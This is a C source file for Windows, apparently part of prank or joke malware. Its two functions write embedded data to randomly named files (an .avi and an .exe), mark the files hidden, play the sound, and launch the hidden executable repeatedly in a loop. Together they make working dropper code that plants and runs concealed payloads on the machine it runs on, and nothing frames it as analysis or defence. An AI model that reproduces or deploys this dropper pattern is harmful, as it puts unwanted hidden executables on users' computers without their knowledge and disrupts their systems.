#include "MU.h"

VOID Boom
	(no_args) 
{

	DWORD bytesWritten;
	HANDLE BOOMHandle = CreateFileW(
		L"umCreGh9Ln.avi", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_NEW, 0, 0
	);
	WriteFile(BOOMHandle, BoomSoundEffect,
		(DWORD)(sizeof(BoomSoundEffect) / sizeof(BoomSoundEffect[0])), &bytesWritten, 0);
	CloseHandle(BOOMHandle);
	SetFileAttributes(L"umCreGh9Ln.avi", FILE_ATTRIBUTE_HIDDEN);

	Sleep(1000);

	IGraphBuilder* pGraph = NULL;
	IMediaControl* pControl = NULL;
	IMediaEvent* pEvent = NULL;
	HRESULT hr = CoInitialize(NULL);
	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
	hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl);
	hr = pGraph->QueryInterface(IID_IMediaEvent, (void**)&pEvent);
	hr = pGraph->RenderFile(L"umCreGh9Ln.avi", 0);
	Sleep(1000);
	if (SUCCEEDED(hr))
	{
		hr = pControl->Run();
		if (SUCCEEDED(hr))
		{
			long evCode;
			pEvent->WaitForCompletion(INFINITE, &evCode);
		}
	}
	pControl->Release();
	pEvent->Release();
	pGraph->Release();
	CoUninitialize();
}

VOID movingWindows
	(unsigned int nCount)
{

	DWORD bytesWritten;
	HANDLE mWindowsHandle = CreateFileW(
		L"ekzGQ5ulul.exe", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_NEW, 0, 0
	);
	WriteFile(mWindowsHandle, MovingWindows,
		(DWORD)(sizeof(MovingWindows) / sizeof(MovingWindows[0])), &bytesWritten, 0);
	CloseHandle(mWindowsHandle);
	SetFileAttributes(L"ekzGQ5ulul.exe", FILE_ATTRIBUTE_HIDDEN);

	Sleep(1000);

	while (nCount != 0)
	{
		system("start ekzGQ5ulul.exe");
		Sleep(100);
		nCount--;
	}
}